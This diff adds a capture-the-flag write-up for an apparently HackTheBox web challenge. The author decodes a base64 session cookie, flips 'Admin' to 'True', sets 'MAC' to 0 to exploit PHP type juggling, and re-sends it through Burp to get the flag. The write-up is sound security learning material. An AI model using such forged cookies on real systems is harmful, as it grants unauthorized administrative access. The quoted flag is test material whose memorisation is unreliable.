@@ -1,0 +1,20 @@
+# When we access this page we get a Forbidden error. However we believe that something strange lies behind... Can you find a way in and retrieve the flag?#
+
+# host: docker.hackthebox.eu port:32673
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+#it was http
+#i changed it to POST /index.php
+
+ses= eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IkZhbHNlIiwiTUFDIjoiZmY2ZDBhNTY4ZDYxZTVhMDNiY2RiMDQ1MDlkNTg4NWQifQ%3D%3D
+# decoded as base64:
+ses= {"User":"whocares","Admin":"False","MAC":"ff6d0a568d61e5a03bcdb04509d5885d"fQ%3D%3D
+# changed req value:
+ses= {"User":"whocares","Admin":"True","MAC":0}
+# and now encoded in Base64 again:
+ses= eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IlRydWUiLCJNQUMiOjB9
+# at burp we set Cookie:ses=eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IlRydWUiLCJNQUMiOjB9
+# now we send this again and get :
+<h1> well done! flag is: TypejugAlingSOulS </h1>
+<br>I suck at php so if you finished the challenge with a method other than type juggling the MAC field or found a bug,please let me know :D <br>-forGP <br><br> oh...<a href="http://imgur.com/m1OOHuE">
+	and look how kind I am :P </a>
